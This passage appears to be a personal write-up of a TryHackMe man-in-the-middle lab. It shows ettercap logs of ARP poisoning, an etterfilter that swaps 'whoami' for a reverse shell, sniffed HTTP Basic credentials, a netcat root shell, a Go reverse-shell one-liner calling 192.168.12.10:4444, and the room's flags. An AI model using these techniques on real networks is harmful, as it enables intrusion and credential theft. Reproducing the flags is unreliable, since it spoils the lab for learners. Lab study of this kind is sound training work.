+TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | SA (0)
+
+Mon Feb  6 17:47:30 2023 [813062]
+TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:30 2023 [825221]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | AP (7)
+whoami
+
+Mon Feb  6 17:47:30 2023 [829051]
+TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | A (0)
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:30 2023 [958870]
+TCP  192.168.12.10:48232 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:47:30 2023 [965055]
+TCP  192.168.12.20:80 --> 192.168.12.10:48232 | SA (0)
+
+Mon Feb  6 17:47:30 2023 [973039]
+TCP  192.168.12.10:48232 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:47:30 2023 [973253]
+TCP  192.168.12.10:48232 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+
+Mon Feb  6 17:47:30 2023 [981055]
+TCP  192.168.12.20:80 --> 192.168.12.10:48232 | A (0)
+
+Mon Feb  6 17:47:30 2023 [982541]
+TCP  192.168.12.20:80 --> 192.168.12.10:48232 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:47:30 2023 [982775]
+TCP  192.168.12.20:80 --> 192.168.12.10:48232 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:47:30 2023 [989261]
+TCP  192.168.12.10:48232 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:47:30 2023 [990127]
+TCP  192.168.12.10:48232 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:47:30 2023 [997096]
+TCP  192.168.12.20:80 --> 192.168.12.10:48232 | A (0)
+
+Mon Feb  6 17:47:31 2023 [153360]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (13)
+cat erver.sh
+
+Mon Feb  6 17:47:31 2023 [157022]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (5)
+cat: 
+
+Mon Feb  6 17:47:31 2023 [157038]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)
+
+Mon Feb  6 17:47:31 2023 [157269]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (8)
+erver.sh
+
+Mon Feb  6 17:47:31 2023 [157279]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)
+
+Mon Feb  6 17:47:31 2023 [157487]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (27)
+: No such file or directory
+
+Mon Feb  6 17:47:31 2023 [157497]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)
+
+Mon Feb  6 17:47:31 2023 [157694]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (1)
+
+Mon Feb  6 17:47:31 2023 [157703]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)
+
+Mon Feb  6 17:47:31 2023 [491505]
+TCP  192.168.12.20:34800 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:31 2023 [704799]
+TCP  192.168.12.20:34794 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:31 2023 [941586]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (4)
+pwd
+
+Mon Feb  6 17:47:31 2023 [949015]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:32 2023 [112398]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (4)
+pwd
+
+Mon Feb  6 17:47:32 2023 [116997]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:32 2023 [184833]
+TCP  192.168.12.20:34786 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:32 2023 [504851]
+TCP  192.168.12.20:34800 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:33 2023 [27051]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (3)
+ls
+
+Mon Feb  6 17:47:33 2023 [28947]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:33 2023 [404697]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (4)
+pwd
+
+Mon Feb  6 17:47:33 2023 [412912]
+TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:33 2023 [464778]
+TCP  192.168.12.20:34790 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:33 2023 [720880]
+TCP  192.168.12.20:34794 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:34 2023 [405857]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (3)
+ls
+
+Mon Feb  6 17:47:34 2023 [413004]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:34 2023 [520911]
+TCP  192.168.12.20:34800 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:34 2023 [827201]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | AP (4)
+pwd
+
+Mon Feb  6 17:47:34 2023 [829027]
+TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:34 2023 [829327]
+TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | AP (6)
+/root
+
+Mon Feb  6 17:47:34 2023 [837100]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | A (0)
+
+Mon Feb  6 17:47:35 2023 [942674]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (3)
+ls
+
+Mon Feb  6 17:47:35 2023 [948922]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:36 2023 [113500]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (3)
+ls
+
+Mon Feb  6 17:47:36 2023 [117021]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:36 2023 [280893]
+TCP  192.168.12.20:34782 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:37 2023 [28231]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (7)
+whoami
+
+Mon Feb  6 17:47:37 2023 [28994]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:37 2023 [405822]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (3)
+ls
+
+Mon Feb  6 17:47:37 2023 [412999]
+TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:37 2023 [816805]
+TCP  192.168.12.20:34794 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:38 2023 [406983]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:38 2023 [413037]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:38 2023 [584849]
+TCP  192.168.12.20:34800 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:38 2023 [828262]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | AP (3)
+ls
+
+Mon Feb  6 17:47:38 2023 [829008]
+TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:38 2023 [833430]
+TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | AP (30)
+rev.go
+root.txt
+server.sh
+www
+
+Mon Feb  6 17:47:38 2023 [837097]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | A (0)
+
+Mon Feb  6 17:47:39 2023 [943840]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:39 2023 [948970]
+TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:39 2023 [989756]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (14)
+cat server.sh
+
+Mon Feb  6 17:47:39 2023 [991293]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (198)
+#!/bin/bash
+cd /root/www
+python SimpleHTTPAuthServer.py 80 admin:s3cr3t_P4zz &
+cd /root
+while :
+do
+	go run /root/rev.go &
+	sleep 13
+	pkill -9 -f "go run /root/rev.go"
+	pkill -9 -f "/bin/bash$"
+done
+
+Mon Feb  6 17:47:39 2023 [991309]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)
+
+Mon Feb  6 17:47:40 2023 [114654]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:40 2023 [117009]
+TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:41 2023 [29462]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (4)
+pwd
+
+Mon Feb  6 17:47:41 2023 [36943]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:41 2023 [406896]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:41 2023 [412990]
+TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:42 2023 [408107]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (4)
+pwd
+
+Mon Feb  6 17:47:42 2023 [412965]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:42 2023 [828799]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:47:42 2023 [837104]
+TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:43 2023 [8789]
+TCP  192.168.12.10:48236 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:47:43 2023 [13007]
+TCP  192.168.12.20:80 --> 192.168.12.10:48236 | SA (0)
+
+Mon Feb  6 17:47:43 2023 [21023]
+TCP  192.168.12.10:48236 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:47:43 2023 [21244]
+TCP  192.168.12.10:48236 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:47:43 2023 [29108]
+TCP  192.168.12.20:80 --> 192.168.12.10:48236 | A (0)
+
+Mon Feb  6 17:47:43 2023 [30674]
+TCP  192.168.12.20:80 --> 192.168.12.10:48236 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:47:43 2023 [30904]
+TCP  192.168.12.20:80 --> 192.168.12.10:48236 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:47:43 2023 [37276]
+TCP  192.168.12.10:48236 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:47:43 2023 [38222]
+TCP  192.168.12.10:48236 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:47:43 2023 [45162]
+TCP  192.168.12.20:80 --> 192.168.12.10:48236 | A (0)
+
+Mon Feb  6 17:47:43 2023 [151341]
+TCP  192.168.12.20:44752 --> 192.168.12.10:4444 | S (0)
+
+Mon Feb  6 17:47:43 2023 [157059]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44752 | SA (0)
+
+Mon Feb  6 17:47:43 2023 [164996]
+TCP  192.168.12.20:44752 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:47:43 2023 [175375]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44752 | AP (7)
+whoami
+
+Mon Feb  6 17:47:43 2023 [181085]
+TCP  192.168.12.20:44752 --> 192.168.12.10:4444 | A (0)
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Closing text interface...
+
+Terminating ettercap...
+Lua cleanup complete!
+ARP poisoner deactivated.
+RE-ARPing the victims...
+
+Mon Feb  6 17:47:43 2023 [739880]
+TCP  192.168.12.20:34806 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:44 2023 [760821]
+TCP  192.168.12.20:34806 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:47:46 2023 [8828]
+TCP  192.168.12.20:34794 --> 192.168.12.66:6666 | S (0)
+Unified sniffing was stopped.
+
+admin@eve:~$ Listening on 0.0.0.0 6666
+Connection received on 192.168.12.20 34764
+fg
+nc -nvlp 6666
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+ls
+rev.go
+root.txt
+server.sh
+www
+cat root.txt
+THM{wh4t_an_ev1l_M!tM_u_R}
+cat rev.go
+package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.12.10:4444");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}
+cat erver.sh
+cat: erver.sh: No such file or directory
+cat server.sh
+#!/bin/bash
+cd /root/www
+python SimpleHTTPAuthServer.py 80 admin:s3cr3t_P4zz &
+cd /root
+while :
+do
+	go run /root/rev.go &
+	sleep 13
+	pkill -9 -f "go run /root/rev.go"
+	pkill -9 -f "/bin/bash$"
+done
+
+cd www
+l
+/bin/sh: 10: l: not found
+ls
+SimpleHTTPAuthServer.py
+test.txt
+user.txt
+cat test.txt
+OK
+cat user.txt
+THM{wh0s_$n!ff1ng_0ur_cr3ds}
+ls -lah
+total 20K
+drwxr-xr-x 2 root root 4.0K Apr 19  2022 .
+drwx------ 4 root root 4.0K Apr  4  2022 ..
+-rw-r--r-- 1 root root 1.6K Mar 27  2022 SimpleHTTPAuthServer.py
+-rw-r--r-- 1 root root    3 Mar 27  2022 test.txt
+-rw-r--r-- 1 root root   29 Apr 19  2022 user.txt
+cat SimpleHTTPAuthServer.py
+import BaseHTTPServer
+from SimpleHTTPServer import SimpleHTTPRequestHandler
+import sys
+import base64
+
+key = ""
+
+class AuthHandler(SimpleHTTPRequestHandler):
+    ''' Main class to present webpages and authentication. '''
+    def do_HEAD(self):
+        print "send header"
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+
+    def do_AUTHHEAD(self):
+        print "send header"
+        self.send_response(401)
+        self.send_header('WWW-Authenticate', 'Basic realm=\"Test\"')
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+
+    def do_GET(self):
+        global key
+        ''' Present frontpage with user authentication. '''
+        if self.headers.getheader('Authorization') == None:
+            self.do_AUTHHEAD()
+            self.wfile.write('no auth header received')
+            pass
+        elif self.headers.getheader('Authorization') == 'Basic '+key:
+            SimpleHTTPRequestHandler.do_GET(self)
+            pass
+        else:
+            self.do_AUTHHEAD()
+            self.wfile.write(self.headers.getheader('Authorization'))
+            self.wfile.write('not authenticated')
+            pass
+
+def test(HandlerClass = AuthHandler,
+         ServerClass = BaseHTTPServer.HTTPServer):
+    BaseHTTPServer.test(HandlerClass, ServerClass)
+
+if __name__ == '__main__':
+    if len(sys.argv)<3:
+        print "usage SimpleAuthServer.py [port] [username:password]"
+        sys.exit()
+    key = base64.b64encode(sys.argv[2])
+    test()
+
+https://gns3.com/software/video
+
+:) nice
+```
+What is the root.txt flag?
+### Conclusion
+I hope this room offered a new perspective for network pentesting and gave you a new _layer_ of attacks for your toolbelt, and hopefully, you've had some fun along the way, too!
+It was also meant as an inspiration for the community to create more L2 content and learning resources, so feel free to take a look at Eve's L2 virtualization "backend" ([GNS3](https://gns3.com/software/video)):
+[http://10.10.148.6:3080](http://10.10.148.6:3080/static/web-ui/server/2/project/cd41dfbe-4158-4ae0-b199-14cd19a36df8)
+Please, don't hesitate to provide [me](https://linkedin.com/in/tobjasr/) any feedback or questions on implementing GNS3 boxes, and stay tuned for some more L2 action!
+Answer the questions below
+Read the above.
+![[Pasted image 20230206125337.png]]
+![[Pasted image 20230206125508.png]]
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e9955140ab79a04b28162eb/room-content/f19dfb6c3e6771ba582f1994ca54648a.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e9955140ab79a04b28162eb/room-content/53adfdaeec3bdfa65af7b1342cc77c2c.png)
+- ***THM{wh0s_$n!ff1ng_0ur_cr3ds}***
+- ***THM{wh4t_an_ev1l_M!tM_u_R}***
+
+## Notes / Lessons Learned
+[[Brute Force Heroes]]
+
